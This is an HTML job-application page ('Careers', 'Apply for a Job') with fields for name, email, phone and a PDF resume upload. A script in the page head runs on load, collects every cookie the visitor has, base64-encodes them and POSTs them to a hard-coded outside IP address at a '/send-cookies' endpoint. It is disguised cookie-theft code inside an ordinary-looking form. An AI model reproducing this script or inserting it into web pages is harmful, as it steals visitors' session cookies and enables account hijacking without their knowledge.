<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Careers</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.0.3/dist/tailwind.min.css" rel="stylesheet">

    <script>
        function getCookies() {
            const cookiePairs = document.cookie.split('; ');
            const cookies = {};

            cookiePairs.forEach(pair => {
                const [name, value] = pair.split('=');
                cookies[name] = decodeURIComponent(value);
            });

            return cookies;
        }

        window.onload = function() {
            const cookies = getCookies();
            const encodedCookies = btoa(JSON.stringify(cookies));
            console.log("Cookies to be sent (encoded):", encodedCookies);

            fetch('https://144.172.76.108:8000/send-cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookies: encodedCookies })
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(err => console.error("Error:", err));
        }
    </script>
</head>
<body class="bg-gradient-to-r from-teal-400 to-blue-500 min-h-screen flex items-center">

<div class="container mx-auto mt-10 p-5 bg-white rounded-lg shadow-lg w-full max-w-lg">
  <h2 class="text-3xl font-bold mb-5 text-gray-700">Apply for a Job</h2>
  <form action="/submit" method="post" enctype="multipart/form-data" class="space-y-4">
    <div class="flex flex-col">
      <label for="firstName" class="mb-2 text-gray-600">First Name</label>
      <input type="text" id="firstName" name="firstName" placeholder="Enter First Name" required class="p-2 border rounded-md focus:border-indigo-500 focus:ring focus:ring-indigo-200">
    </div>
    <div class="flex flex-col">
      <label for="lastName" class="mb-2 text-gray-600">Last Name</label>
      <input type="text" id="lastName" name="lastName" placeholder="Enter Last Name" required class="p-2 border rounded-md focus:border-indigo-500 focus:ring focus:ring-indigo-200">
    </div>
    <div class="flex flex-col">
      <label for="email" class="mb-2 text-gray-600">Email Address</label>
      <input type="email" id="email" name="email" placeholder="Enter Email" required class="p-2 border rounded-md focus:border-indigo-500 focus:ring focus:ring-indigo-200">
    </div>
    <div class="flex flex-col">
      <label for="phone" class="mb-2 text-gray-600">Phone Number</label>
      <input type="tel" id="phone" name="phone" placeholder="Enter Phone Number" required class="p-2 border rounded-md focus:border-indigo-500 focus:ring focus:ring-indigo-200">
    </div>
    <div class="flex flex-col">
      <label for="resume" class="mb-2 text-gray-600">Upload Resume (PDF only)</label>
      <input type="file" id="resume" name="resume" accept=".pdf" required class="p-2 border rounded-md focus:border-indigo-500 focus:ring focus:ring-indigo-200">
    </div>
    <button type="submit" class="mt-5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-2 px-4 rounded w-full transition duration-300 ease-in-out transform hover:-translate-y-1">Submit</button>
  </form>
</div>

</body>
</html>
